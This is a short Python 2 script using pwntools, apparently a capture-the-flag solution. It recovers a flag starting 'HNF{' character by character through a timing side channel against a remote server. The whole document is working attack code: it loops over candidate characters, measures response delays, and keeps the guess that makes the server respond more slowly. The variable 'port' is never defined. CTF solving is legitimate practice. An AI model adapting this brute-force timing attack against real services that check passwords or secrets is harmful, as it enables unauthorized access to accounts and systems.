#!/usr/bin/python2

from pwn import *
import time

flag = "HNF{"
max_time  = 1

while True:
    for c in "!?}_15scktemng4afbsydh5ij37lopqruvwx02689z-@{":
        r = remote("hnfremoteserver", port)
        r.recv()

        before = time.time()
        r.sendline(flag+c)
        r.recv()
        r.close()

        after = time.time()
        if after-before > max_time:
            max_time = max_time+1
            print max_time
            flag = flag+c
            break

    print flag
